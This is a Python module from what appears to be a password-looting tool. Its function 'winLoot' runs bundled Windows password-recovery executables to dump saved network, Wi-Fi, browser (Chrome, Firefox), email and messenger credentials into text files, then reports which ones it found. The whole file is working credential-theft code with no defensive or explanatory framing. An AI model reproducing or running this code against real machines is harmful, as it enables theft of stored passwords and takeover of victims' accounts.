import os
import subprocess

reports = ''

# main module will loot for passwords in windows
def winLoot():
	global reports
	reports += '\n -  Looting Windows...\n'
	# Network passwords
	try: 
		subprocess.call(['windows\netpass.exe', '/stext', 'netpass.txt'])
		if os.path.isfile('netpass.txt') and os.path.getsize('netpass.txt') > 0:
			reports += '[*] Found network passwords.\n'
	except: reports += '[e] Network: Access denied.\n'
	# Wireless passwords
	try: 
		subprocess.call(['windows\WirelessKeyView.exe', '/stext', 'wifi.txt'])
		if os.path.isfile('wifi.txt') and os.path.getsize('wifi.txt') > 0:
			reports += '[*] Found wi-fi passwords.\n'
	except: reports += '[e] Wi-Fi: Access denied.\n'
	# Browser passwords
	try: 
		subprocess.call(['windows\WebBrowserPassView.exe', '/stext', 'web.txt'])
		if os.path.isfile('web.txt') and os.path.getsize('web.txt') > 0:
			reports += '[*] Found browser passwords.\n'
	except: reports += '[e] Browser: Access denied.\n'
	# Chrome passwords
	try: 
		subprocess.call(['windows\ChromePass.exe', '/stext', 'chromed.txt'])
		if os.path.isfile('chromed.txt') and os.path.getsize('chromed.txt') > 0:
			reports += '[*] Found chrome passwords.\n'
	except: reports += '[e] Chrome: Access denied.\n'
	# Firefox passwords
	try: 
		subprocess.call(['windows\PasswordFox.exe', '/stext', 'firefoxd.txt'])
		if os.path.isfile('firefoxd.txt') and os.path.getsize('firefoxd.txt') > 0:
			reports += '[*] Found firefox passwords.\n'
	except: reports += '[e] Firefox: Access denied.\n'
	# Email passwords
	try: 
		subprocess.call(['windows\mailpv.exe', '/stext', 'email.txt'])
		if os.path.isfile('email.txt') and os.path.getsize('email.txt') > 0:
			reports += '[*] Found email passwords.\n'
	except: reports += '[e] Email: Access denied.\n'
	# Messenger passwords
	try: 
		subprocess.call(['windows\mspass.exe', '/stext', 'chat.txt'])
		if os.path.isfile('chat.txt') and os.path.getsize('chat.txt') > 0:
			reports += '[*] Found messaging passwords.\n'
	except: reports += '[e] Messaging: Access denied.\n'
	return reports